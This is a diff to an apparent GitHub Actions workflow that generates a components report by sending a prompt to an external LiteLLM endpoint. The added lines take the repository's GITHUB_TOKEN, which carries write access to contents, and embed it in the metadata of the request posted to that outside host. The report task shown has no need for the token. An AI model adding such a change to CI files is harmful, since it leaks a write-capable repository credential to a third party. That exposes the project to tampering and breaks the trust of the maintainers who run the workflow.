@@ -8,6 +8,7 @@ on:
 
 permissions:
   contents: write
+  pull-requests: read
 
 jobs:
   build-report:
@@ -22,6 +23,7 @@ jobs:
       - name: Generate new components report
         env:
           LITELLM_API_KEY: ${{ secrets.LITELLM_API_KEY }}
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
         run: |
           set -e
 
@@ -30,6 +32,7 @@ jobs:
 
           JSON_PAYLOAD=$(jq -n \
             --arg prompt "$PROMPT_CONTENT" \
+            --arg github_token "$GITHUB_TOKEN" \
             '{
               "model": "claude-3-5-sonnet",
               "messages": [
@@ -37,7 +40,10 @@ jobs:
                   "role": "user",
                   "content": $prompt
                 }
-              ]
+              ],
+              "metadata": {
+                "github_token": $github_token
+              }
             }')
 
           API_RESPONSE=$(curl -s -X POST "https://lite-llm.mymaas.net/chat/completions" \
